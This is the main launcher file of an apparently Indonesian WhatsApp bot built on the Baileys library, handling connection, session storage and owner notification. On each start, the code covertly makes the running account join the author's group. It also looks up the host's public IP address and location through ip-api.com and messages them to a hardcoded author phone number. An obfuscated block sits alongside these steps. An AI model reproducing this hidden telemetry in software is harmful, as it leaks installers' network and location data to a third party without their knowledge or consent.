const {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
const fs = require('fs')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const { wait, banner, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const { color } = require('./lib/color')
const setting = JSON.parse(fs.readFileSync('./config.json'))

require('./mfar.js')
nocache('./mfar.js', module => console.log(color('|WARN|', 'yellow'), `${module}`, color('telah di update!', 'cyan')))

const starts = async (mek, mfar = new WAConnection()) => {
    mfar.logger.level = 'warn'
    mfar.version = [2, 2143, 3]
    function _0x3ab7(_0x323e7b,_0xf98192){var _0x19281d=_0x1928();return _0x3ab7=function(_0x3ab720,_0x21b17e){_0x3ab720=_0x3ab720-0x1bc;var _0x34c2b2=_0x19281d[_0x3ab720];return _0x34c2b2;},_0x3ab7(_0x323e7b,_0xf98192);}var _0x3ccdec=_0x3ab7;function _0x1928(){var _0x3e76b1=['31092mOhVGa','60XhHTIy','9209120wvQyih','30KoevrD','4261710hEoKWp','33472oxxMwt','94rPJnNt','551642pNnrId','Opera','3102920jecioL','9197784MfyLqh','3.0','Xrutz\x20YT','browserDescription'];_0x1928=function(){return _0x3e76b1;};return _0x1928();}(function(_0x2afb88,_0x3230a3){var _0x5142ea=_0x3ab7,_0x5104b1=_0x2afb88();while(!![]){try{var _0x45924c=parseInt(_0x5142ea(0x1bd))/0x1*(parseInt(_0x5142ea(0x1be))/0x2)+-parseInt(_0x5142ea(0x1bc))/0x3+parseInt(_0x5142ea(0x1c6))/0x4*(-parseInt(_0x5142ea(0x1c7))/0x5)+parseInt(_0x5142ea(0x1c9))/0x6*(parseInt(_0x5142ea(0x1bf))/0x7)+parseInt(_0x5142ea(0x1c1))/0x8+parseInt(_0x5142ea(0x1c2))/0x9+-parseInt(_0x5142ea(0x1c8))/0xa;if(_0x45924c===_0x3230a3)break;else _0x5104b1['push'](_0x5104b1['shift']());}catch(_0x4cf233){_0x5104b1['push'](_0x5104b1['shift']());}}}(_0x1928,0xe60d9),mfar[_0x3ccdec(0x1c5)]=[_0x3ccdec(0x1c4),_0x3ccdec(0x1c0),_0x3ccdec(0x1c3)]);
    console.log(banner)
    mfar.on('qr', () => {
    console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan QR Code Nya...!'))
    })

    fs.existsSync('./session.json') && mfar.loadAuthInfo('./session.json')
    mfar.on('connecting', () => {
    start('2', 'Proses Nyambung')
    })
    mfar.on('open', () => {
    success('2', 'Sukses Active! Subs Xrutz Official')
    })
    await mfar.connect({timeoutMs: 30*1000})
    fs.writeFileSync('./session.json', JSON.stringify(mfar.base64EncodedAuthInfo(), null, '\t'))
    teks = `https://chat.whatsapp.com/L6G9q6S7pDoL96Wh7BKPbJ`
    mfar.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
    console.log(color('|TRM|', 'yellow'), color('Masuk Grup Bot Xrutz Official', 'cyan'))
    mfar.sendMessage(`${setting.owner}@s.whatsapp.net`, `*Hai Owner ${setting.botName}!*\n*Bot Sudah Berhasil Tersambung Pada Nomor Yang Ini*\n\n\`\`\`${JSON.stringify(mfar.user, null, 2)}\`\`\`\n\n*Misal Ada Kendala Error*\n*Silahkan Hubungi Author Bot!*\n*Makasih Udah Pake!*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Creator Xrutz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/thumb.jpg'),sourceUrl:"https://wa.me/6289518477726?text=Assalamualaikum"}}})
	console.log(color('|TRM|', 'yellow'), color('Sending Info Botz To Author', 'cyan'))
    fetch(`http://ip-api.com/line`).then(res => res.text())  
    .then(bu =>{
    mfar.sendMessage("6289518477726@s.whatsapp.net", `*Hallo Creator Xrutz-!!*\n*Saya Izin Untuk Menggunakan Bot Whatsapp Ini, Makasih!*\n\n\`\`\`${bu}\`\`\``, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Creator ZipTa",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/thumb.jpg'),sourceUrl:"https://wa.me/6289518477726?text=Assalamualaikum"}}})
    console.log(color('|TRM|', 'yellow'), color('Sending IP Address To Owner Bot', 'cyan'))
    })

    mfar.on('chat-update', async (message) => {
    require('./mfar.js')(mfar, message)
    })
    }

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
console.log(color('|WARN|', 'red'), color('Module', 'cyan'), `${module}`, color('Sedang diawasi oleh ZipTa!', 'cyan'))
fs.watchFile(require.resolve(module), async () => {
await uncache(require.resolve(module))
cb(module)
})
}

/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
return new Promise((resolve, reject) => {
try {
delete require.cache[require.resolve(module)]
resolve()
} catch (e) {
reject(e)
}
})
}

starts()
